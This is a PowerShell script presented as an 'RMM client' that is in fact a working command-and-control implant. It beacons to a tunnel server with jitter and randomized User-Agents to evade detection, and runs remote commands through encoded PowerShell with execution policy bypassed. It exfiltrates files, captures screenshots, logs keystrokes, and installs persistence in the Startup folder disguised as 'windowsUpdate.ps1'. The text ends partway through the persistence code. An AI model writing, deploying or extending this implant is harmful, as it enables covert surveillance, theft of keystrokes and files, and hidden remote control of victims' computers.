# Enhanced RMM PowerShell Client with Dynamic Configuration
# Set RMM_BASE_URL in the environment to override (no trailing slash), or edit $u below.
#
# HTTP connections (optional):
#   - Tunnel host is always reached over IPv4: DNS returns only A records; IPv6 literals / IPv6-only DNS are rejected.
#   - Default: new HttpWebRequest each call, KeepAlive=false (TCP typically closes after each exchange; no shared cookie jar).
#   - Persistent: CookieContainer + KeepAlive=true (TCP may stay open across requests).
#   Set $persistentHttp = $true below, or set environment variable RMM_PERSISTENT_HTTP=1 (env wins when set and non-empty).

if ($env:RMM_BASE_URL -and $env:RMM_BASE_URL.Trim().Length -gt 0) {
    $u = $env:RMM_BASE_URL.Trim().TrimEnd('/')
} else {
    $u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'
}
if ($u -match 'REPLACE-WITH-YOUR-CLOUDFLARED-URL') {
    Write-Host "[-] Set the environment variable RMM_BASE_URL to your server base URL (no trailing slash), or edit `$u in this script." -ForegroundColor Red
    exit 1
}
$sessionId = [System.Guid]::NewGuid().ToString()
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME

# Remote shell CWD (in memory only; each cmd/pwsh run is otherwise stateless).
$script:RmmShellCwd = (Get-Location).Path

# Default configuration (will be updated by server)
$baseSleepSeconds = 60          # Default 1 minute
$jitterPercent = 30             # Default 30% jitter
$maxRetries = 3
$currentRetry = 0

# Persistent HTTP: $false = no shared CookieContainer (default). $true = reuse cookies across calls.
# Env RMM_PERSISTENT_HTTP (1/true/yes/on) overrides this when the variable is set and non-empty.
$persistentHttp = $false

$script:UsePersistentHttp = $false
if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
    $script:UsePersistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
} else {
    $script:UsePersistentHttp = $persistentHttp
}
if ($script:UsePersistentHttp) {
    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
} else {
    $script:RmmCookieContainer = $null
}

function Resolve-RmmTunnelIpv4 {
    param([Parameter(Mandatory = $true)][System.Uri]$Uri)
    $hostPart = $Uri.Host
    if ($hostPart -match '^\[.*\]$') {
        throw "RMM: IPv6 URL hosts are not supported. Use the tunnel hostname or an IPv4 address."
    }
    $parsed = $null
    if ([System.Net.IPAddress]::TryParse($hostPart, [ref]$parsed)) {
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            return @{ Ipv4 = $parsed; OriginalHost = $hostPart }
        }
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
            throw "RMM: IPv6 address in URL is not supported. Use a hostname with an A record or an IPv4 literal."
        }
    }
    $ipv4 = $null
    foreach ($a in [System.Net.Dns]::GetHostAddresses($hostPart)) {
        if ($a.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            $ipv4 = $a
            break
        }
    }
    if ($null -eq $ipv4) {
        throw "RMM: No IPv4 address for host '$hostPart' (IPv6-only or unresolved). The client cannot use IPv6 to reach the tunnel."
    }
    return @{ Ipv4 = $ipv4; OriginalHost = $hostPart }
}

function Convert-RmmHttpResponseContent {
    param(
        [string]$Raw,
        [string]$ContentType
    )
    if ($null -eq $Raw) { return $null }
    $trim = $Raw.Trim()
    if ($trim.Length -eq 0) { return $null }
    $ct = if ($ContentType) { $ContentType } else { '' }
    $looksJson = ($ct -match 'json') -or ($trim.StartsWith('{')) -or ($trim.StartsWith('['))
    if ($looksJson) {
        try {
            return $Raw | ConvertFrom-Json
        } catch {
            return $Raw
        }
    }
    return $Raw
}

function Invoke-RmmRestMethod {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [ValidateSet('Get', 'Post')][string]$Method = 'Get',
        [object]$Body,
        [string]$ContentType,
        [hashtable]$Headers = @{},
        [ValidateSet('Continue', 'Stop', 'SilentlyContinue', 'Ignore')][string]$RestErrorAction = 'Continue'
    )
    if ($null -eq $Headers) { $Headers = @{} }

    $origUri = $null
    try {
        $origUri = [System.Uri]::new($Uri)
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $resolved = $null
    try {
        $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $builder = New-Object System.UriBuilder $origUri
    $builder.Host = $resolved.Ipv4.ToString()
    $wireUri = $builder.Uri

    $req = [System.Net.HttpWebRequest]::Create($wireUri)
    $req.Method = $Method
    $req.Host = $resolved.OriginalHost
    $req.AllowAutoRedirect = $true
    $req.Timeout = 300000
    # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
    # Persistent mode: keep-alive on so one TCP can carry multiple requests.
    $req.KeepAlive = [bool]$script:UsePersistentHttp
    if ($script:UsePersistentHttp -and $script:RmmCookieContainer) {
        $req.CookieContainer = $script:RmmCookieContainer
    }

    foreach ($key in $Headers.Keys) {
        $name = [string]$key
        $val = [string]$Headers[$key]
        if ($name -match '(?i)^(User-Agent)$') {
            $req.UserAgent = $val
        } elseif ($name -match '(?i)^(Accept)$') {
            $req.Accept = $val
        } elseif ($name -match '(?i)^(Host|Connection)$') {
            continue
        } else {
            try {
                [void]$req.Headers.Add($name, $val)
            } catch {
                try {
                    $req.Headers[$name] = $val
                } catch {
                }
            }
        }
    }

    if ($Method -eq 'Post' -and $null -ne $Body) {
        if ($ContentType) {
            $req.ContentType = $ContentType
        } else {
            $req.ContentType = 'text/plain; charset=utf-8'
        }
        $enc = [System.Text.Encoding]::UTF8
        $bytes = $enc.GetBytes([string]$Body)
        $req.ContentLength = $bytes.Length
        $ws = $req.GetRequestStream()
        try {
            $ws.Write($bytes, 0, $bytes.Length)
        } finally {
            $ws.Close()
        }
    }

    try {
        $response = $req.GetResponse()
        $http = [System.Net.HttpWebResponse]$response
        $statusNum = [int]$http.StatusCode
        if ($statusNum -ge 400) {
            try {
                $es = $http.GetResponseStream()
                $er = New-Object System.IO.StreamReader($es, [System.Text.Encoding]::UTF8)
                $null = $er.ReadToEnd()
                $er.Close()
            } catch {
            }
            throw [System.Net.WebException]::new(
                "The remote server returned an error: ($statusNum) $($http.StatusCode).",
                $null,
                [System.Net.WebExceptionStatus]::ProtocolError,
                $http)
        }
        $rs = $http.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($rs, [System.Text.Encoding]::UTF8)
        $raw = $reader.ReadToEnd()
        $reader.Close()
        $ctOut = $http.ContentType
        $http.Close()
        return (Convert-RmmHttpResponseContent -Raw $raw -ContentType $ctOut)
    } catch [System.Net.WebException] {
        $we = $_.Exception
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            if ($we.Response) {
                try {
                    $errs = $we.Response.GetResponseStream()
                    $edr = New-Object System.IO.StreamReader($errs, [System.Text.Encoding]::UTF8)
                    $null = $edr.ReadToEnd()
                    $edr.Close()
                } catch {
                }
                try { $we.Response.Close() } catch {
                }
            }
            return $null
        }
        throw $we
    } catch {
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            return $null
        }
        throw
    }
}

# Jitter function - adds random delay to avoid pattern detection
function Get-JitteredSleep {
    param(
        [int]$baseSeconds,
        [int]$jitterPercent
    )
    
    # Calculate jitter range
    $jitterRange = [int]($baseSeconds * ($jitterPercent / 100))
    $jitterValue = Get-Random -Minimum (-$jitterRange) -Maximum ($jitterRange + 1)
    $actualSleep = [Math]::Max(1, $baseSeconds + $jitterValue)
    
    # Add micro-jitter for additional randomness (milliseconds)
    $microJitter = Get-Random -Minimum 100 -Maximum 1000
    $totalMilliseconds = ($actualSleep * 1000) + $microJitter
    
    Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
    
    # Sleep using milliseconds only
    Start-Sleep -Milliseconds $totalMilliseconds
    return $actualSleep
}

# Exponential backoff for retries
function Get-BackoffSleep {
    param([int]$retryCount)
    
    # Cap retryCount to prevent overflow
    $cappedRetry = [Math]::Min($retryCount, 10)
    
    # Calculate backoff using integer math
    $backoffSeconds = 1
    for ($i = 0; $i -lt $cappedRetry; $i++) {
        $backoffSeconds = $backoffSeconds * 2
        if ($backoffSeconds -gt 60) {
            $backoffSeconds = 60
            break
        }
    }
    
    # Ensure backoff is within bounds
    $backoffSeconds = [Math]::Max(1, [Math]::Min(60, $backoffSeconds))
    
    # Add jitter to backoff
    $jitteredBackoff = Get-JitteredSleep -baseSeconds $backoffSeconds -jitterPercent 30
    return $jitteredBackoff
}

# Update configuration from server (idle __CONFIG__ no-op returns early without log noise).
function Update-Configuration {
    param([string]$configString)
    
    $parts = $configString -split " "
    if ($parts.Count -ge 3) {
        try {
            $newSleep = [int]$parts[1]
            $newJitter = [int]$parts[2]
            # Server sends __CONFIG__ on every idle /cmd; skip logs and work when nothing changed.
            if ($newSleep -eq $script:baseSleepSeconds -and $newJitter -eq $script:jitterPercent -and
                $newSleep -ge 1 -and $newSleep -le 3600 -and $newJitter -ge 0 -and $newJitter -le 100) {
                return
            }
            
            Write-Host "[*] Processing configuration update: $configString" -ForegroundColor Cyan
            
            $changed = $false
            
            # Validate ranges
            if ($newSleep -ge 1 -and $newSleep -le 3600) {
                if ($newSleep -ne $script:baseSleepSeconds) {
                    $script:baseSleepSeconds = $newSleep
                    $changed = $true
                    Write-Host "[+] Sleep interval updated to $baseSleepSeconds seconds" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid sleep value: $newSleep (must be 1-3600)" -ForegroundColor Red
            }
            
            if ($newJitter -ge 0 -and $newJitter -le 100) {
                if ($newJitter -ne $script:jitterPercent) {
                    $script:jitterPercent = $newJitter
                    $changed = $true
                    Write-Host "[+] Jitter updated to $jitterPercent%" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid jitter value: $newJitter (must be 0-100)" -ForegroundColor Red
            }
            
            # Send acknowledgment only when values actually changed (server sends __CONFIG__ every idle poll)
            if ($changed) {
                try {
                    $ackUrl = "$u/result?id=$sessionId&type=config_ack"
                    $ackBody = "Configuration updated: Sleep=$baseSleepSeconds, Jitter=$jitterPercent%"
                    Invoke-RmmRestMethod -Uri $ackUrl -Method Post -Body $ackBody -RestErrorAction SilentlyContinue
                    Write-Host "[+] Configuration acknowledgment sent" -ForegroundColor DarkGray
                } catch {
                    # Silently ignore ACK errors
                }
            }
        } catch {
            Write-Host "[-] Failed to parse configuration: $_" -ForegroundColor Red
        }
    }
}

# Helper function for Base64 encoding
function ConvertTo-Base64 {
    param([string]$text)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    return [Convert]::ToBase64String($bytes)
}

function ConvertFrom-Base64 {
    param([string]$base64)
    $bytes = [Convert]::FromBase64String($base64)
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# Randomized User-Agent to avoid fingerprinting
function Get-RandomUserAgent {
    $userAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
    )
    return $userAgents | Get-Random
}

# Safe JSON parser — Invoke-RestMethod already deserializes JSON to PSCustomObject
function Parse-CmdResponse {
    param($response)
    if ($null -eq $response) {
        return @{ command = ""; type = "none" }
    }
    if ($response -is [string]) {
        try {
            $o = $response | ConvertFrom-Json
            return Parse-CmdResponse -response $o
        } catch {
            Write-Host "[!] Received non-JSON string, treating as plain command" -ForegroundColor Yellow
            return @{ command = $response; type = "execute" }
        }
    }
    $cmd = $null
    $typ = $null
    foreach ($p in $response.PSObject.Properties) {
        if ($p.Name -match '^(?i)command$') { $cmd = [string]$p.Value }
        elseif ($p.Name -match '^(?i)type$') { $typ = [string]$p.Value }
    }
    if ($null -eq $cmd) { $cmd = '' }
    if ($null -eq $typ) {
        $typ = if ([string]::IsNullOrWhiteSpace($cmd)) { 'none' } else { 'execute' }
    }
    return @{ command = $cmd; type = $typ }
}

# Text results include the originating command so the C2 can label output when the queue has many items.
function Send-RmmTextResult {
    param(
        [Parameter(Mandatory = $true)][string]$CommandLine,
        [Parameter(Mandatory = $true)][string]$Text,
        [hashtable]$Headers = @{}
    )
    $uri = "$u/result?id=$sessionId"
    $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
    $json = $payload | ConvertTo-Json -Compress -Depth 10
    Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
}

# 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
function ConvertTo-RmmPlainText {
    param([object[]]$Chunks)
    if ($null -eq $Chunks -or $Chunks.Count -eq 0) { return '' }
    ($Chunks | ForEach-Object {
        if ($_ -is [System.Management.Automation.ErrorRecord]) {
            $_.Exception.Message.TrimEnd()
        } elseif ($_ -is [System.Exception]) {
            $_.Message
        } else {
            "$_"
        }
    }) -join [Environment]::NewLine
}

function Apply-RmmCwdFromCmdOutput {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $Text }
    $last = $null
    $kept = New-Object System.Collections.ArrayList
    foreach ($line in ($Text -split "`r?`n")) {
        if ($line -match '^\s*RMM_CWD_SIG:(.+)\s*$') {
            $last = $Matches[1].Trim()
            continue
        }
        [void]$kept.Add($line)
    }
    if ($last) {
        try {
            if (Test-Path -LiteralPath $last -PathType Container) {
                $script:RmmShellCwd = (New-Object System.IO.DirectoryInfo -ArgumentList $last).FullName
            }
        } catch { }
    }
    return ($kept -join [Environment]::NewLine).TrimEnd()
}

function Get-RmmPlainCmdOutput {
    param([Parameter(Mandatory)][string]$InnerCommand)
    $base = $script:RmmShellCwd
    if (-not (Test-Path -LiteralPath $base -PathType Container)) {
        $base = $env:USERPROFILE
        $script:RmmShellCwd = $base
    }
    $baseQ = '"' + ($base.Trim() -replace '"', '""') + '"'
    $combined = 'cd /d ' + $baseQ + ' & ' + $InnerCommand + ' & echo RMM_CWD_SIG:%CD%'
    $stdoutFile = [System.IO.Path]::GetTempFileName()
    $stderrFile = [System.IO.Path]::GetTempFileName()
    try {
        $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList @('/d', '/c', $combined) `
            -Wait -NoNewWindow -PassThru `
            -RedirectStandardOutput $stdoutFile -RedirectStandardError $stderrFile
        $so = [System.IO.File]::ReadAllText($stdoutFile)
        $se = [System.IO.File]::ReadAllText($stderrFile)
        $parts = @()
        if ($so.TrimEnd().Length) { $parts += $so.TrimEnd() }
        if ($se.TrimEnd().Length) { $parts += $se.TrimEnd() }
        $text = $parts -join [Environment]::NewLine
        if ($proc.ExitCode -ne 0 -and -not $text.Trim()) {
            $text = "(cmd exited with code $($proc.ExitCode))"
        }
        return (Apply-RmmCwdFromCmdOutput -Text $text)
    } finally {
        Remove-Item -LiteralPath $stdoutFile, $stderrFile -Force -ErrorAction SilentlyContinue
    }
}

# Default: cmd.exe. Prefix PS: or powershell: for Windows PowerShell; pwsh: for PS 7 if installed.
# Prefix cmd: forces CMD. Uses -EncodedCommand for PS so quotes and pipelines are reliable.

# CMD does not treat '...' as quoting (unlike bash); convert simple 'segment' pairs to "segment" for net, etc.
function Convert-RmmCmdSingleQuotesForCmd {
    param([string]$Line)
    if ([string]::IsNullOrEmpty($Line)) { return $Line }
    $sb = New-Object System.Text.StringBuilder
    $i = 0
    $len = $Line.Length
    $sq = [char]39
    while ($i -lt $len) {
        if ($Line[$i] -eq $sq) {
            $end = $Line.IndexOf($sq, $i + 1)
            if ($end -lt 0) {
                [void]$sb.Append($Line[$i])
                $i++
                continue
            }
            $inner = $Line.Substring($i + 1, $end - $i - 1)
            $innerEsc = $inner -replace '"', '""'
            [void]$sb.Append('"').Append($innerEsc).Append('"')
            $i = $end + 1
        } else {
            [void]$sb.Append($Line[$i])
            $i++
        }
    }
    return $sb.ToString()
}

function Normalize-RmmCmdExeLine {
    param([string]$Line)
    $t = $Line.Trim()
    # CMD has no `ls`; map common Unix habit so operators are not punished.
    if ($t -match '^(?i)ls$') { return 'dir' }
    return (Convert-RmmCmdSingleQuotesForCmd -Line $Line)
}

function Invoke-RmmUserCommand {
    param([Parameter(Mandatory = $true)][string]$RawCommand)
    $trimmed = $RawCommand.TrimStart()
    try {
        if ($trimmed -match '^(?i)(?:powershell|ps)\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after PS: or powershell:' }
            $wdEsc = $script:RmmShellCwd -replace "'", "''"
            $innerPs = "Set-Location -LiteralPath '$wdEsc' -ErrorAction SilentlyContinue`r`n" + $inner + "`r`nWrite-Output ('RMM_CWD_SIG:' + (Get-Location).Path)"
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $out = & powershell.exe @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive',
                '-EncodedCommand', $enc
            ) 2>&1
            $txt = [string](ConvertTo-RmmPlainText @($out))
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)pwsh\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after pwsh:' }
            $wdEsc = $script:RmmShellCwd -replace "'", "''"
            $innerPs = "Set-Location -LiteralPath '$wdEsc' -ErrorAction SilentlyContinue`r`n" + $inner + "`r`nWrite-Output ('RMM_CWD_SIG:' + (Get-Location).Path)"
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $launcher = if (Get-Command pwsh.exe -ErrorAction SilentlyContinue) { 'pwsh.exe' } else { 'powershell.exe' }
            $out = & $launcher @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive',
                '-EncodedCommand', $enc
            ) 2>&1
            $txt = [string](ConvertTo-RmmPlainText @($out))
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)cmd\s*:\s*(.*)$') {
            return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $Matches[1]))
        }
        return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $RawCommand))
    } catch {
        return [string]$_.Exception.Message
    }
}

# Register with RMM server
$registered = $false
$retryCount = 0

Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
if ($script:UsePersistentHttp) {
    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive. IPv4-only. Clear RMM_PERSISTENT_HTTP / set `$persistentHttp = `$false` for default." -ForegroundColor DarkGray
} else {
    Write-Host "[*] HTTP: IPv4-only; KeepAlive=false (TCP usually closes after each request). Persistent: `$persistentHttp = `$true` or RMM_PERSISTENT_HTTP=1." -ForegroundColor DarkGray
}

while (-not $registered -and $retryCount -lt $maxRetries) {
    try {
        $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
        $headers = @{
            "User-Agent" = Get-RandomUserAgent
            "Accept" = "*/*"
            "Cache-Control" = "no-cache"
        }
        
        $response = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
        Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
        $registered = $true
        $currentRetry = 0
    } catch {
        $forbidden = $false
        try {
            $resp = $_.Exception.Response
            if ($resp -and [int]$resp.StatusCode -eq 403) { $forbidden = $true }
        } catch {}
        if ($forbidden) {
            Write-Host "[*] Session was terminated on the server; exiting" -ForegroundColor Yellow
            exit 0
        }
        $retryCount++
        Write-Host "[-] Registration failed (attempt $retryCount/$maxRetries): $_" -ForegroundColor Red
        if ($retryCount -lt $maxRetries) {
            $backoffTime = Get-BackoffSleep -retryCount $retryCount
            Write-Host "[*] Retrying in $backoffTime seconds..." -ForegroundColor Yellow
        } else {
            Write-Host "[-] Registration failed after $maxRetries attempts, exiting" -ForegroundColor Red
            exit 1
        }
    }
}

# Main loop
while ($true) {
    try {
        # Add jitter before each poll cycle
        $actualSleep = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
        
        # Randomized headers for each request
        $headers = @{
            "User-Agent" = Get-RandomUserAgent
            "Accept" = "*/*"
            "Cache-Control" = "no-cache"
            "X-Request-ID" = [System.Guid]::NewGuid().ToString()
        }
        
        # Get command from RMM
        $cmdUrl = "$u/cmd?id=$sessionId"
        $response = Invoke-RmmRestMethod -Uri $cmdUrl -Method Get -Headers $headers -RestErrorAction Stop
        
        # Reset retry counter on success
        $currentRetry = 0
        
        # Invoke-RestMethod returns PSCustomObject for JSON; handle string or object
        $cmdData = Parse-CmdResponse -response $response
        $command = [string]$cmdData.command
        $cmdType = [string]$cmdData.type
        
        if ($command -and $command -ne "") {
            if ($command -like "__CONFIG__ *") {
                $null = Update-Configuration -configString $command
                continue
            }
            Write-Host "[>] Received command: $command" -ForegroundColor Cyan
            
            # Handle special commands FIRST before anything else
            if ($command -eq "__STOP__") {
                Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
                continue
            }
            elseif ($command -eq "__EXIT__") {
                Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
                exit 0
            }
            elseif ($command -like "__DOWNLOAD__ *") {
                # File download (exfiltrate file from target) — server expects one JSON body: filename + content (base64)
                $filePath = $command.Substring(12).Trim()
                if (Test-Path $filePath) {
                    $maxB64Chars = 12000000  # ~9MB binary cap; avoids huge single POST on PoC
                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                    $fileBase64 = [Convert]::ToBase64String($fileBytes)
                    $fileName = Split-Path $filePath -Leaf
                    if ($fileBase64.Length -gt $maxB64Chars) {
                        $err = "File too large for PoC single-shot upload (base64 length $($fileBase64.Length) > $maxB64Chars)"
                        Send-RmmTextResult -CommandLine $command -Text $err -Headers $headers
                        Write-Host "[-] $err" -ForegroundColor Red
                    } else {
                        $resultData = @{
                            filename = $fileName
                            content = $fileBase64
                        } | ConvertTo-Json -Compress
                        $resultUrl = "$u/result?id=$sessionId&type=file_upload"
                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $resultData -ContentType "application/json" -Headers $headers -RestErrorAction Stop
                        Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                    }
                } else {
                    $errorMsg = "File not found: $filePath"
                    Send-RmmTextResult -CommandLine $command -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__UPLOAD__ *") {
                # File upload (receive file from RMM)
                $parts = $command -split "`n", 2
                if ($parts.Count -eq 2) {
                    $uploadCmd = $parts[0]
                    $jsonData = $parts[1]
                    $filePath = $uploadCmd.Substring(10).Trim()
                    
                    $fileData = $jsonData | ConvertFrom-Json
                    $fileBytes = [Convert]::FromBase64String($fileData.content)
                    [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                    
                    Send-RmmTextResult -CommandLine $command -Text "File uploaded successfully: $filePath" -Headers $headers
                    Write-Host "[+] File uploaded: $filePath" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__SCREENSHOT__") {
                # Take screenshot
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    
                    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                    
                    $memoryStream = New-Object System.IO.MemoryStream
                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                    $screenshotBase64 = [Convert]::ToBase64String($memoryStream.ToArray())
                    
                    $graphics.Dispose()
                    $bitmap.Dispose()
                    $memoryStream.Dispose()
                    
                    $resultUrl = "$u/result?id=$sessionId&type=screenshot"
                    Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -RestErrorAction Stop
                    Write-Host "[+] Screenshot captured and sent" -ForegroundColor Green
                } catch {
                    $errorMsg = "Screenshot failed: $_"
                    Send-RmmTextResult -CommandLine '__SCREENSHOT__' -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__KEYLOG__ *") {
                # Keylogging: job writes to a temp file (Start-Job cannot share in-memory state with parent)
                $action = $command.Substring(10).Trim()
                $klJobName = "RMM_Keylogger"
                
                if ($action -eq "start") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    
                    $prefix = if ($sessionId.Length -ge 8) { $sessionId.Substring(0, 8) } else { $sessionId }
                    $keylogPath = Join-Path $env:TEMP ("rmm_keylog_{0}.log" -f $prefix)
                    if (Test-Path -LiteralPath $keylogPath) { Remove-Item -LiteralPath $keylogPath -Force -ErrorAction SilentlyContinue }
                    
                    $scriptBlock = {
                        param([string]$path, [int]$jitterBase, [int]$jitterPct)
                        Add-Type -AssemblyName System.Windows.Forms
                        $down = @{}
                        $acc = New-Object System.Text.StringBuilder
                        while ($true) {
                            $jr = [int]($jitterBase * ($jitterPct / 100.0))
                            $jv = Get-Random -Minimum (-$jr) -Maximum ($jr + 1)
                            Start-Sleep -Milliseconds ([Math]::Max(15, 40 + $jv))
                            for ($vk = 8; $vk -lt 256; $vk++) {
                                $st = [System.Windows.Forms.Control]::GetKeyState([int]$vk)
                                $pressed = (($st -band 0x8000) -ne 0)
                                if ($pressed) {
                                    if (-not $down.ContainsKey($vk)) {
                                        $down[$vk] = $true
                                        $name = $vk.ToString()
                                        try {
                                            $ek = [System.Windows.Forms.Keys]$vk
                                            $name = $ek.ToString()
                                        } catch { }
                                        [void]$acc.Append("[$name]")
                                    }
                                } elseif ($down.ContainsKey($vk)) {
                                    $null = $down.Remove($vk)
                                }
                            }
                            if ($acc.Length -ge 400) {
                                [System.IO.File]::AppendAllText($path, $acc.ToString())
                                $acc.Clear() | Out-Null
                            }
                        }
                    }
                    Start-Job -ScriptBlock $scriptBlock -Name $klJobName -ArgumentList $keylogPath, $baseSleepSeconds, $jitterPercent | Out-Null
                    $script:rmmKeylogPath = $keylogPath
                    $result = "Keylogger started; log file: $keylogPath"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger started" -ForegroundColor Green
                }
                elseif ($action -eq "stop") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    $result = "Keylogger stopped"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger stopped" -ForegroundColor Green
                }
                elseif ($action -eq "dump") {
                    $kp = $script:rmmKeylogPath
                    if ($kp -and (Test-Path -LiteralPath $kp)) {
                        $logData = [System.IO.File]::ReadAllText($kp)
                        if (-not $logData) { $logData = "(empty buffer)" }
                        $resultUrl = "$u/result?id=$sessionId&type=keylog"
                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $logData -Headers $headers -RestErrorAction SilentlyContinue
                        Write-Host "[+] Keylog data sent" -ForegroundColor Green
                    } else {
                        Send-RmmTextResult -CommandLine $command -Text "Keylogger log not found or not started" -Headers $headers
                    }
                }
            }
            elseif ($command -eq "__INSTALL_PERSIST__") {
                # Install persistence — align copied script with current $u, sleep, and jitter
                if (-not $PSCommandPath) {
                    $err = "install_persist requires running the client from a saved .ps1 file (PSCommandPath is empty)"
                    Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $err -Headers $headers
                    Write-Host "[-] $err" -ForegroundColor Red
                }
                else {
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                $currentScript = Get-Content -LiteralPath $PSCommandPath -Raw -ErrorAction Stop
                $uEsc = $u -replace '''', ''''''
                $currentScript = $currentScript -replace '(?m)^\s*\$u\s*=\s*.+$', ('$u = ''{0}''' -f $uEsc)
                $currentScript = $currentScript -replace '(?m)^\s*\$baseSleepSeconds\s*=\s*\d+', ('$baseSleepSeconds = {0}' -f $baseSleepSeconds)
                $currentScript = $currentScript -replace '(?m)^\s*\$jitterPercent\s*=\s*\d+', ('$jitterPercent = {0}' -f $jitterPercent)
                $ph = if ($script:UsePersistentHttp) { '$true' } else { '$false' }
                $currentScript = $currentScript -replace '(?m)^\s*\$persistentHttp\s*=\s*\$(?:true|false)\s*$', ('$persistentHttp = {0}' -f $ph)
                Set-Content -LiteralPath $scriptPath -Value $currentScript -Encoding UTF8 -Force
                
